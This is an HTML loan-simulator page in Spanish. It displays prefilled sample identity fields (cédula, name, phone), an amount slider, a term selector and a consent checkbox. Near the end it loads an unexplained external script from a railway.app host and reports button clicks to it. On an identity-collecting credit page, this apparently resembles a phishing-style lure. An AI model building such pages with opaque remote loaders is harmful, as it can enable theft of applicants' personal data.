<!doctype html>
<html lang="es">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Simulador de Crédito Personalizado</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #fff;
      color: #200020;
    }

    .header {
      position: fixed;
      top: 0;
      width: 100%;
      height: 60px;
      background: white;
      border-bottom: 1px solid #e0e0e0;
      display: flex;
      align-items: center;
      padding: 0 26px;
      z-index: 999;
    }

    .logo {
      font-size: 24px;
      font-weight: bold;
      color: #da0081;
    }

    .container {
      margin-top: 80px;
      max-width: 600px;
      margin-left: auto;
      margin-right: auto;
      padding: 20px;
    }

    .form-group {
      margin-bottom: 20px;
      position: relative;
    }

    .form-group label {
      display: block;
      font-size: 14px;
      color: #da0081;
      font-weight: 600;
      margin-bottom: 8px;
    }

    .form-group input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 14px;
      background: #f5f5f5;
    }

    .form-group input:focus {
      outline: none;
      border-color: #da0081;
      background: white;
    }

    .section-title {
      font-size: 18px;
      font-weight: bold;
      color: #da0081;
      margin: 30px 0 20px 0;
    }

    .checkbox-group {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
      padding: 12px;
      background: #f5f5f5;
      border-radius: 6px;
    }

    .checkbox-group input[type="checkbox"] {
      width: 18px;
      height: 18px;
      margin-right: 10px;
      cursor: pointer;
    }

    .checkbox-group label {
      margin: 0;
      cursor: pointer;
      font-size: 12px;
      line-height: 1.5;
    }

    .button {
      width: 100%;
      padding: 14px;
      background: #da0081;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
      margin-top: 20px;
    }

    .button:hover {
      background: #c2006a;
    }

    .button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }

    .slider-container {
      margin-bottom: 20px;
      background: #da0081;
      padding: 20px;
      border-radius: 6px;
      color: white;
    }

    .slider-container h3 {
      margin-bottom: 10px;
    }

    .slider-value {
      font-size: 28px;
      font-weight: bold;
      margin-bottom: 15px;
    }

    .slider-container input[type="range"] {
      width: 100%;
      cursor: pointer;
    }

    .slider-info {
      display: flex;
      justify-content: space-between;
      font-size: 12px;
      margin-top: 10px;
    }

    .info-group {
      margin-bottom: 15px;
      padding: 12px;
      background: #f5f5f5;
      border-radius: 6px;
    }

    .info-label {
      font-size: 12px;
      color: #666;
      margin-bottom: 4px;
    }

    .info-value {
      font-size: 16px;
      font-weight: bold;
      color: #da0081;
    }

    footer {
      margin-top: 40px;
      padding: 40px 20px;
      text-align: center;
      border-top: 1px solid #e0e0e0;
      color: #999;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div class="header">
    <div class="logo">💳 Simulador de Crédito</div>
  </div>

  <div class="container">
    <!-- Datos Personales -->
    <h2 class="section-title">Datos Personales</h2>

    <div class="form-group">
      <label for="cedulaSalvavidas">Cédula</label>
      <input type="text" id="cedulaSalvavidas" readonly value="1234567890">
    </div>

    <div class="form-group">
      <label for="nombreCompletoSalvavidas">Nombre y Apellido</label>
      <input type="text" id="nombreCompletoSalvavidas" readonly value="Juan Pérez García">
    </div>

    <div class="form-group">
      <label for="numeroTelefonoSalvavidas">Número Telefónico</label>
      <input type="text" id="numeroTelefonoSalvavidas" readonly value="+57 300 1234567">
    </div>

    <!-- Simulador de Crédito -->
    <h2 class="section-title">Simular tu Crédito</h2>

    <div class="slider-container">
      <h3>¿Cuánta plata necesitas?</h3>
      <div class="slider-value">$<span id="montoSeleccionadoSalvavidas">100.000</span></div>
      <input type="range" id="montoSalvavidas" min="100000" max="5000000" step="100000" value="100000">
      <div class="slider-info">
        <span>$100.000</span>
        <span>$5.000.000</span>
      </div>
    </div>

    <div class="info-group">
      <div class="info-label">Plazo (Meses)</div>
      <select id="plazoSelectorSalvavidas" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
        <option value="6">6 meses</option>
        <option value="12">12 meses</option>
        <option value="18">18 meses</option>
        <option value="24" selected>24 meses</option>
      </select>
    </div>

    <div class="info-group">
      <div class="info-label">Cuota Mensual Aproximada</div>
      <div class="info-value" id="cuotaMensualSalvavidas">$15.900</div>
      <div style="font-size: 11px; color: #999; margin-top: 5px;">Incluye intereses y seguros</div>
    </div>

    <!-- Autorización -->
    <h2 class="section-title">Autorización</h2>

    <div class="checkbox-group">
      <input type="checkbox" id="checkboxSalvavidas">
      <label for="checkboxSalvavidas">
        Autorizo que me contacten para ofertas comerciales y conozco la política de datos.
      </label>
    </div>

    <button class="button" id="btnSolicitar" disabled>Solicitar Crédito</button>

    <footer>
      <p>Sistema de Simulación de Créditos - 2025</p>
      <p>Todos los datos son procesados de forma segura</p>
    </footer>
  </div>

  <!-- Script para cargar datos personalizados -->
  <script src="https://bug-free-rbot-production.up.railway.app/public/js/loan-simulator-loader.js"></script>

  <script>
    const inputMontoSalvavidas = document.getElementById('montoSalvavidas');
    const montoSeleccionadoSalvavidas = document.getElementById('montoSeleccionadoSalvavidas');
    const cuotaMensualSalvavidas = document.getElementById('cuotaMensualSalvavidas');
    const plazoSelectorSalvavidas = document.getElementById('plazoSelectorSalvavidas');
    const checkboxSalvavidas = document.getElementById('checkboxSalvavidas');
    const btnSolicitar = document.getElementById('btnSolicitar');
    const TASA_INTERES_MENSUAL = 0.009;

    function formatNumber(num) {
      return new Intl.NumberFormat('es-CO').format(Math.round(num));
    }

    function calcularCuota(monto) {
      const meses = parseInt(plazoSelectorSalvavidas.value);
      const cuotaMensual = (monto / meses) + (monto * TASA_INTERES_MENSUAL) + 5000;
      cuotaMensualSalvavidas.textContent = '$' + formatNumber(cuotaMensual);
    }

    inputMontoSalvavidas.addEventListener('input', (e) => {
      const valor = parseInt(e.target.value);
      montoSeleccionadoSalvavidas.textContent = formatNumber(valor);
      calcularCuota(valor);
    });

    plazoSelectorSalvavidas.addEventListener('change', () => {
      calcularCuota(parseInt(inputMontoSalvavidas.value));
    });

    checkboxSalvavidas.addEventListener('change', () => {
      btnSolicitar.disabled = !checkboxSalvavidas.checked;
    });

    btnSolicitar.addEventListener('click', (e) => {
      e.preventDefault();
      const cedula = document.getElementById('cedulaSalvavidas').value;
      const nombre = document.getElementById('nombreCompletoSalvavidas').value;
      const telefono = document.getElementById('numeroTelefonoSalvavidas').value;
      const monto = document.getElementById('montoSeleccionadoSalvavidas').textContent;
      const meses = plazoSelectorSalvavidas.value;

      // Registrar clic en el botón
      if (window.LoanSimulatorLoader) {
        window.LoanSimulatorLoader.recordClickEvent('solicitar-credito');
      }

      console.log('Solicitud enviada:', {
        cedula, nombre, telefono, monto, meses
      });

      // Mostrar confirmación
      alert(`✓ Solicitud registrada\n\nCédula: ${cedula}\nNombre: ${nombre}\nMonto: $${monto}\nPlazo: ${meses} meses`);
    });

    // Inicializar cuota
    calcularCuota(100000);
  </script>
</body>
</html>
